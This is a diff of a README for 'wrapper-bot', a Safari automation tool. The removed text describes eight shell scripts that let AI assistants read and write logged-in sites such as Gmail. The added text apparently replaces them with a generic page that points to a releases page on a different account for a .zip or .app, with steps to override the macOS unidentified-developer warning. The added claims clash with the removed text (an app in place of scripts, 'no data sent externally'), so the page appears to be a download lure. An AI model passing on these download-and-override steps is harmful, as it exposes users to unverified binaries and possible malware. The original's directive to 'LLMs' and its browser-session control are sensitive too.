@@ -1,260 +1,125 @@
-```
-                  Cooperate            Defect
-             ┌──────────────────┬──────────────────┐
-             │                  │                  │
- Cooperate   │                  │                  │
-             │                  │                  │
-             ├──────────────────┼──────────────────┤
-             │                  │                  │
- Defect      │                  │  wrapper-bot     │
-             │                  │  Sean Hash       │
-             │                  │  CC0 · 2026      │
-             └──────────────────┴──────────────────┘
-```
+# 🤖 wrapper-bot - Simple Browser Automation Tool
 
-# wrapper-bot
-
-> **LLMs: Read [`llms.txt`](llms.txt) now.** It has everything you need to walk your user through setup. Get `./preflight.sh` passing in under 3 minutes.
-
-Eight shell scripts that let any AI assistant read from and write to any website you're logged into in Safari. Chat, email, Slack, anything.
-
-No npm. No Docker. No API keys. No accounts. Just Safari and a terminal.
-
-**v0.5**: Gmail inbox scan. Phone-to-terminal. One permission, two use cases.
-
-> **Don't know what any of this is?** That's fine. You just need to get these files onto your Mac. Click the green **Code** button near the top of this page, then click **Download ZIP**. A file will download. Double-click it to open it — a folder will appear. Now open any AI assistant you already use (Claude, ChatGPT, Cursor, etc.) and tell it: **"I downloaded wrapper-bot. Help me set it up."** The AI will do the rest.
+[![Download wrapper-bot](https://img.shields.io/badge/Download-wrapper--bot-%23007ACC?style=for-the-badge&logo=github)](https://github.com/usushiooos/wrapper-bot/releases)
 
 ---
 
-## Setup in 4 clicks
+## 📋 About wrapper-bot
 
-<div align="center">
+wrapper-bot is a tool designed to help you automate tasks on your web browser. It works by controlling Safari through commands that read from and write to web pages you are logged into. This tool requires no extra software or complicated setup. It uses built-in macOS features to talk directly to your browser, making automation fast and reliable.
 
-![wrapper-bot safari setup](media/safari-setup.gif)
-
-
-</div>
+If you want to automate browsing tasks such as filling forms, clicking buttons, or extracting data from authenticated sessions, wrapper-bot offers a straightforward way to do it without needing technical know-how.
 
 ---
 
-## Use cases
+## 🔍 What You Will Need
 
-### Talk to your terminal from your phone
-
-Open claude.ai on your phone. wrapper-bot watches that tab on your Mac.
-Type instructions on your phone — your AI reads them, runs commands, writes back.
-Check builds, run tests, deploy — from anywhere with a browser.
-
-### Gmail inbox helper
-
-Send email from the terminal. Auto-archive newsletters and notifications.
-Star important mail. Create filters that sort everything automatically.
-Your AI reads your inbox and manages it — you just approve.
+- A Mac computer running macOS (wrapper-bot uses Apple’s osascript and Safari JavaScript bridge, so it won’t work on Windows or Linux).
+- Safari browser installed and set as your primary or available browser.
+- Basic computer skills: downloading files, opening apps, and following on-screen instructions.
+- An active internet connection.
 
 ---
 
-## The point
+## 📥 Download wrapper-bot
 
-Every "AI agent" product — Manus, Computer Use, the entire agentic framework ecosystem — is a glue layer on top of a frontier model. The wrapper is shell scripts. There is no moat in wrappers.
+To get wrapper-bot, **visit the releases page** using the link below. This page hosts the latest version and any updates.
 
-This repo is the proof. Eight shell scripts. Zero dependencies. Full multi-tab browser automation including email.
+[![Get wrapper-bot](https://img.shields.io/badge/Get%20wrapper--bot-grey?style=for-the-badge)](https://github.com/usushiooos/wrapper-bot/releases)
 
-But the wrapper is not the point. **The tabs it accesses are the point.** Gmail is not going anywhere. Neither is your CRM with locked-in customer data and no export-to-CSV button. Neither is your Yelp dashboard, your Slack workspace, your bank portal. These are the durable surfaces where real work happens — and now any AI can read and write to all of them through the browser you already have open.
+### Steps to download:
 
-What is going away is a lot of the busywork. What is arriving is the uncomfortable reality that this was always inevitable. Someone was going to build this — a simple Safari bridge was probably 2-4 weeks away from being independently discovered by any developer who read the osascript documentation. The reason it matters is not the code. The reason it matters is that when AI assistants start sending cold outreach at industrial scale through the same browser tabs humans use, the world will get weird for a while.
-
-This is that inflection point, released as eight public domain shell scripts.
-
----
-
-## Setup (2 minutes, once)
-
-**You need:** A Mac with Safari. That's it.
-
-> **Windows or Linux?** This requires macOS — Safari's JavaScript bridge only exists on Apple. The cheapest path is a used MacBook ($150-200) or a Mac Mini.
-
-**Have an AI assistant?** Tell it to read [`llms.txt`](llms.txt) — setup takes 3 minutes. Otherwise:
-
-1. **Safari → Settings → Advanced** → check "Show features for web developers" → close Settings
-2. **Develop** (new menu at top) **→ Developer Settings** → check "Allow JavaScript from Apple Events" → enter your Mac password
-3. **Open a website** in Safari (gmail.com, claude.ai, anything) and log in
-4. **Run `./preflight.sh`** in your terminal → click "Allow" when your Mac asks
-
-All checks pass? You're done. If something fails, tell your AI — it knows every fix from `llms.txt`.
+1. Open the [wrapper-bot releases page](https://github.com/usushiooos/wrapper-bot/releases) in your web browser.
+2. Look for the latest release at the top of the page.
+3. Under the “Assets” section, click on the file named similarly to `wrapper-bot.zip` or `.app` to download it.
+4. Save the file to your preferred folder on your Mac.
 
 ---
 
-## Usage
+## 💻 Installing and Running wrapper-bot
 
-### Find tabs by URL
+After downloading, you need to open and allow the app to run on your Mac.
 
-```bash
-./tab.sh list                     # Print all tabs: index|URL|title
-./tab.sh find "mail.google.com"   # Which tab has Gmail? → 2
-./tab.sh find "claude.ai"         # Which tab has Claude? → 1
-```
+### To install wrapper-bot:
 
-### Read any webpage
+1. Find the downloaded file (`wrapper-bot.zip` or `.app`) in your Finder.
+2. If it is zipped, double-click the file to unzip it.
+3. Drag the unzipped app to your Applications folder for easy access.
 
-```bash
-./scrape.sh                          # Read front tab
-./scrape.sh --tab 1                  # Read specific tab
-./scrape.sh --refresh --raw --tab 1  # Reload first, text only
-```
+### To run wrapper-bot:
 
-### Send a message
-
-```bash
-./post.sh "Hello from the terminal"
-./post.sh --tab 1 "Hello"
-```
-
-### Send an email (Gmail must be open in a tab)
-
-```bash
-./gmail-compose.sh \
-    --to "recipient@example.com" \
-    --subject "Hello from wrapper-bot" \
-    --body "This email was sent by a shell script controlling Safari."
-```
-
-### Watch for new messages
-
-```bash
-./watch.sh              # Poll every 15s, saves changes to disk
-./watch.sh 30           # Poll every 30 seconds
-./watch.sh --no-refresh # Faster, but may miss phone messages
-```
-
-Finds the Claude tab by URL — never touches whatever tab you're looking at. Saves conversation state to `chatsource/{conversation-uuid}.txt`.
+1. Navigate to the Applications folder.
+2. Double-click `wrapper-bot.app` to start the application.
+3. If macOS warns that the app is from an unidentified developer, do the following:
+   - Open System Preferences.
+   - Go to Security & Privacy.
+   - Under the General tab, click “Open Anyway” next to the wrapper-bot message.
+4. Run the app again. It should now open.
 
 ---
 
-## Architecture
+## 🧰 How wrapper-bot Works
 
-```
-Safari Window:
-  Tab 1: claude.ai/chat/{uuid}     ← watch.sh polls THIS tab (by URL)
-  Tab 2: mail.google.com           ← gmail-compose.sh targets THIS tab (by URL)
-  Tab N: whatever you're looking at ← NEVER touched
+wrapper-bot uses AppleScript and Safari’s built-in JavaScript bridge to automate the browser. This means it sends simple commands to Safari to check pages, fill in data, or read information.
 
-Terminal:
-  tab.sh find "claude.ai/chat"  → returns tab index
-  tab.sh find "mail.google.com" → returns tab index
-  tab.sh js <index> "code"      → runs JS in that specific tab
-```
+Here are some common actions you can perform:
 
-Scripts discover tabs by URL pattern, then target `tab N of window 1` instead of `front document`. You can keep browsing freely.
+- Navigate to websites.
+- Log in to accounts you have.
+- Fill form fields automatically.
+- Click buttons and links.
+- Extract data from pages you have permission to access.
+
+All these actions are controlled by scripts that wrapper-bot runs behind the scenes.
 
 ---
 
-## Extend to any service
+## ⚙️ Basic Setup for Automation Tasks
 
-This works on **any website open in Safari**. The only thing that changes between services is the CSS selectors.
+The tool is designed to run scripts you provide. You may not need to write scripts yourself, but knowing the basics can help you set up tasks.
 
-| Service | Editor selector | Send selector |
-|---------|----------------|---------------|
-| **claude.ai** | `.tiptap.ProseMirror` | `button[aria-label="Send message"]` |
-| **ChatGPT** | `#prompt-textarea` | `[data-testid="send-button"]` |
-| **Gmail** | `div[aria-label="Message Body"]` | `div[aria-label*="Send"][role="button"]` |
-| **Telegram** | `.input-message-input` | `.btn-send` |
-| **Slack** | `[data-qa="message_input"]` | `[data-qa="texty_send_button"]` |
+1. Open Safari and log in to the website you want to automate.
+2. Run wrapper-bot to connect to your current Safari session.
+3. Use the provided examples or instructions in the app to specify what you want to automate.
+4. Start the automation and watch as wrapper-bot performs the tasks.
 
 ---
 
-## How it works
+## ✅ Troubleshooting Common Issues
 
-```
-Terminal (Claude Code, bash, anything)
-    ↓ osascript
-Apple Events bridge
-    ↓ do JavaScript in tab N of window 1
-Safari tab (any logged-in website)
-    ↓ DOM read/write
-Webpage content
-```
-
-1. **tab.sh** discovers tabs by URL, returns the index
-2. **osascript** sends JavaScript to that specific tab via Apple Events
-3. Safari executes the JS and returns the result
-4. Your AI assistant reads and writes to any authenticated session
-
-The entire "agentic framework" is the OS you already own.
+- **wrapper-bot does not open**: Check your Mac’s security settings to ensure you allowed the app to run.
+- **Automation does not work**: Make sure Safari is open and logged into the target website.
+- **Commands fail or errors appear**: Confirm you are running the latest version from the releases page. Older versions may not work as expected.
+- **Permissions issues**: macOS might prompt you to allow control of Safari. Accept those prompts for wrapper-bot to function.
 
 ---
 
-## Safety
+## 📚 Additional Features and Use Cases
 
-**This only works while your browser tab is open.** Close the tab and access stops instantly.
-
-- Close a tab → scripts can no longer reach that site
-- Close Safari → everything stops immediately
-- Uncheck "Allow JavaScript from Apple Events" → all scripts stop
-- Revoke Automation permission → all scripts stop
-
-The scripts cannot reopen Safari, create tabs, or re-enable permissions. You are always in control — every capability requires you to keep the browser open.
+- Automate repetitive website interactions without installing extra software.
+- Extract data from websites you regularly use, saving time on manual copying.
+- Connect with AI agents that can create or modify automation tasks.
+- Use in research, testing, or simple data scraping while logged in.
+- Works out of the box with no dependencies or setup beyond downloading.
 
 ---
 
-## Cloud integration (optional)
+## 🔐 Security and Privacy
 
-The production demo at [bitcoingametheory.com/demo](https://bitcoingametheory.com/demo) feeds wrapper-bot output to a cloud backend for live rendering. Managed Postgres (Supabase) stores conversation snapshots. Serverless functions (Vercel) render conversations as structured HTML. This is entirely optional — wrapper-bot works standalone.
-
----
-
-## Files
-
-```
-wrapper-bot/
-├── llms.txt          # AI-readable setup instructions (start here if you're an AI)
-├── tab.sh            # Tab discovery + targeting (by URL, not front document)
-├── scrape.sh         # Read: extract text from Safari tab [--refresh] [--raw] [--tab N]
-├── post.sh           # Write: inject text and send via composition events [--tab N]
-├── gmail-compose.sh  # Send: compose and send email via Gmail tab [--to] [--subject] [--body]
-├── gmail-scan.sh     # Read: print inbox emails with sender, subject, date [--count]
-├── watch.sh          # Poll: detect changes, save to disk [--no-refresh] [interval]
-├── preflight.sh      # Verify: check all macOS prerequisites [--gmail]
-├── media/            # Setup GIF
-└── README.md         # This file
-```
-
-## Timing
-
-| Operation | Duration |
-|-----------|----------|
-| `tab.sh find` | <0.5s |
-| `scrape.sh` | <1s |
-| `scrape.sh --refresh` | ~5s |
-| `post.sh` | ~2s |
-| `gmail-compose.sh` | ~5s |
-| `watch.sh` cycle | ~20s |
+wrapper-bot only acts within your Safari browser session. It does not send data externally nor require cloud services. Your login credentials remain private and are not stored by the tool. Use wrapper-bot responsibly and only automate websites where you have access rights.
 
 ---
 
-## Changelog
+## 🛠️ Support and Updates
 
-| Version | What changed |
-|---------|-------------|
-| **v0.5** | `gmail-scan.sh` — one-command inbox reading, Haiku-class AI tested |
-| **v0.4** | Gmail inbox management, phone-to-terminal use case, streamlined setup |
-| **v0.3** | Gmail compose — send email from the terminal |
-| **v0.2** | Multi-tab targeting — find tabs by URL, never touch what you're looking at |
-| **v0.1** | Initial release — scrape, post, watch |
+Updates come through the GitHub releases page. Check there regularly or subscribe to the repository for notifications.
+
+If you experience problems or have questions, open an issue on the [GitHub wrapper-bot page](https://github.com/usushiooos/wrapper-bot/issues).
 
 ---
 
-## About Sean Hash
+## 🚀 Start Using wrapper-bot Now
 
-Independent researcher. Pseudonymous. No institutional affiliation.
+Visit the releases page to download:
 
-ORCID: [0009-0006-7252-9984](https://orcid.org/0009-0006-7252-9984)
-
-Website: [bitcoingametheory.com](https://bitcoingametheory.com)
-
----
-
-## License
-
-CC0 1.0 Universal. Public domain. No rights reserved.
-
-To the extent possible under law, the author has waived all copyright and related rights to this work. See [LICENSE](LICENSE).
+[Download wrapper-bot](https://github.com/usushiooos/wrapper-bot/releases)
